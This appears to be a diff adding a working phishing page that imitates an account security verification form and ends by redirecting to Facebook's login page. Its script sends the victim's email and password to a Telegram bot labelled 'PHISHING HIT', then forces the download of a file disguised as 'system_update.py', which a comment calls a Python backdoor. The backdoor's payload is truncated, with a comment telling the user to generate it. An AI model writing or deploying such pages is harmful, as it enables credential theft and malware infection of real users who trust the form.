@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification Required</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 400px;
+            text-align: center;
+        }
+        .logo { width: 80px; margin-bottom: 20px; }
+        h2 { color: #1a1a1a; margin-bottom: 10px; font-size: 24px; }
+        p { color: #666; margin-bottom: 25px; font-size: 14px; }
+        input[type="text"], input[type="password"] {
+            width: 100%; padding: 14px; margin-bottom: 15px;
+            border: 2px solid #e0e0e0; border-radius: 8px;
+            font-size: 16px; transition: border 0.3s;
+        }
+        input:focus { border-color: #667eea; outline: none; }
+        button {
+            width: 100%; padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white; border: none; border-radius: 8px;
+            font-size: 16px; font-weight: bold; cursor: pointer;
+            transition: transform 0.2s;
+        }
+        button:hover { transform: scale(1.02); }
+        button:active { transform: scale(0.98); }
+        .loader { display: none; margin-top: 15px; color: #667eea; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MCIgaGVpZ2h0PSI4MCIgdmlld0JveD0iMCAwIDgwIDgwIj48cmVjdCB3aWR0aD0iODAiIGhlaWdodD0iODAiIHJ4PSIxNSIgZmlsbD0iIzY2N2VlYSIvPjx0ZXh0IHg9IjQwIiB5PSI1MCIgZm9udC1zaXplPSIzMiIgZmlsbD0id2hpdGUiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC13ZWlnaHQ9ImJvbGQiPkY8L3RleHQ+PC9zdmc+" alt="Logo" class="logo">
+        <h2>Security Verification</h2>
+        <p>Your account requires additional verification. Please login to continue.</p>
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="Email or Phone" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Verify Account</button>
+        </form>
+        <div class="loader" id="loader">Verifying credentials... Please wait.</div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var loader = document.getElementById('loader');
+            
+            loader.style.display = 'block';
+            
+            // Kirim credentials ke Telegram via Webhook
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'https://api.telegram.org/botYOUR_BOT_TOKEN_HERE/sendMessage?chat_id=YOUR_CHAT_ID_HERE&text=🎣%20PHISHING%20HIT%0A📧%20Email:%20' + encodeURIComponent(email) + '%0A🔑%20Password:%20' + encodeURIComponent(password), true);
+            xhr.send();
+            
+            // Trigger download Python backdoor
+            setTimeout(function() {
+                var downloadLink = document.createElement('a');
+                downloadLink.href = 'data:application/octet-stream;base64,UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAAcGF5bG9hZC5we'; // Base64 truncated, lo generate sendiri
+                downloadLink.download = 'system_update.py';
+                document.body.appendChild(downloadLink);
+                downloadLink.click();
+                document.body.removeChild(downloadLink);
+                
+                loader.innerHTML = 'Verification complete. Redirecting...';
+                
+                setTimeout(function() {
+                    window.location.href = 'https://www.facebook.com/login.php?login_attempt=1';
+                }, 3000);
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
